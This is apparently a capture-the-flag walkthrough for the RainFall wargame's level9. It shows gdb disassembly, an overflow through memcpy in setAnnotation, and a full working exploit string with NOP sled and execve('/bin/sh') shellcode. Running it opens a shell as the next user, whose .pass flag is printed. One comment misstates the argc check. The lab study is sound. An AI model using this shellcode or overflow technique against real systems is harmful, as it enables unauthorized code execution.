# We have a executable "level9" lets do some test!

>level9@RainFall:~$ ./level9
>level9@RainFall:~$ ./level9 test
>level9@RainFall:~$ ./level9 test test
>level9@RainFall:~$ ./level9 test test test
>level9@RainFall:~$

# Hum nothing let's use gdb

>level9@RainFall:~$ gdb level9
(gdb) disas main
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>


# If argc > 1 the program exit



   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
[...]
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
[...]
   0x08048693 <+159>:	call   *%edx
[...]

# It call multiple function and at the end call the address of edx

# Let's disasamble the function

(gdb) disas _Znwj
Dump of assembler code for function _Znwj@plt:
   0x08048530 <+0>:	jmp    *0x8049b70
   0x08048536 <+6>:	push   $0x40
   0x0804853b <+11>:	jmp    0x80484a0
End of assembler dump.

(gdb) disas _ZN1NC2Ei
Dump of assembler code for function _ZN1NC2Ei:
   0x080486f6 <+0>:	push   %ebp
   0x080486f7 <+1>:	mov    %esp,%ebp
   0x080486f9 <+3>:	mov    0x8(%ebp),%eax
   0x080486fc <+6>:	movl   $0x8048848,(%eax)
   0x08048702 <+12>:	mov    0x8(%ebp),%eax
   0x08048705 <+15>:	mov    0xc(%ebp),%edx
   0x08048708 <+18>:	mov    %edx,0x68(%eax)
   0x0804870b <+21>:	pop    %ebp
   0x0804870c <+22>:	ret    
End of assembler dump

# Nothing to report...

(gdb) disas _ZN1N13setAnnotationEPc
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   %ebp
   0x0804870f <+1>:	mov    %esp,%ebp
   0x08048711 <+3>:	sub    $0x18,%esp
   0x08048714 <+6>:	mov    0xc(%ebp),%eax
   0x08048717 <+9>:	mov    %eax,(%esp)
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    0x8(%ebp),%edx
   0x08048722 <+20>:	add    $0x4,%edx
   0x08048725 <+23>:	mov    %eax,0x8(%esp)
   0x08048729 <+27>:	mov    0xc(%ebp),%eax
   0x0804872c <+30>:	mov    %eax,0x4(%esp)
   0x08048730 <+34>:	mov    %edx,(%esp)
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave  
   0x08048739 <+43>:	ret    
End of assembler dump.

# This one call memcpy! And seems to memcpy our argument let's fast check this with ltrace

>level9@RainFall:~$ ltrace ./level9 AAAAAAAAAAAAA
[...]
strlen("AAAAAAAAAAAAA")                          = 13
memcpy(0x0804a00c, "AAAAAAAAAAAAA", 13)          = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
+++ exited (status 11) +++
>level9@RainFall:~$ 

# Bingo plus it memcpy the lenght of strlen so we can put a argument as long as we want

(gdb)r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Starting program: /home/user/level9/level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) 

# What's the instruction at 0x08048682 ?

0x08048682 <+142>:	mov    (%eax),%edx

# Let's put a breakpoint here

(gdb) b *0x08048682
Breakpoint 1 at 0x8048682
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/user/level9/level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048682 in main ()
(gdb) x $eax
0x41414141:	Cannot access memory at address 0x41414141

# So eax is overwrite by our argument and the program crash because it cannot mov the address 0x41414141 in edx

# So if we calculate the padding we can manipulate the call of edx

(gdb) r $(python -c "print('A' * 90 + 'B' * 4 + 'C' * 4 + 'D' * 4 + 'E' * 4 + 'F' * 4 + 'G' * 4)")
Starting program: /home/user/level9/level9 $(python -c "print('A' * 90 + 'B' * 4 + 'C' * 4 + 'D' * 4 + 'E' * 4 + 'F' * 4 + 'G' * 4)")

Breakpoint 1, 0x08048682 in main ()
(gdb) x $eax
0x47474646:	Cannot access memory at address 0x47474646

# The last value are G one so if we calculate the padding is 108 (90 + 4 * 5 + 2 = 112 - 4 = 108)

# We can redirect the edx call to the address where memcpy have copied our argument (0x0804a00c) 

# And we can build our exploit like the level2

(gdb) r $(python -c "print('\x90' * 63 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x0c\xa0\x04\x08')")

Starting program: /home/user/level9/level9 $(python -c "print('\x90' * 63 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x0c\xa0\x04\x08')")

Breakpoint 1, 0x08048682 in main ()
(gdb) x $eax
0x804a00c:	0x90909090

# Nice eax point to the /90

(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x90909090 in ?? ()

# But the program crash at the edx call.

# Because edx point to 0x90909090 and can't call this address. So we must change a little our python line so edx call a valid address

(gdb) r $(python -c "print('\x0c\xa0\x04\x08' + '\x90' * 59 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x0c\xa0\x04\x08')")

Starting program: /home/user/level9/level9 $(python -c "print('\x0c\xa0\x04\x08' + '\x90' * 59 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x0c\xa0\x04\x08')")

Breakpoint 1, 0x08048682 in main ()
(gdb) continue
Continuing.
process 2890 is executing new program: /bin/dash
$ whoami
level9

# It work let's do this outside gdb

>level9@RainFall:~$ ./level9 $(python -c "print('\x0c\xa0\x04\x08' + '\x90' * 59 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x0c\xa0\x04\x08')")
$ whoami
bonus0
$ cd ..
$ cd bonus0
$ cat .pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$










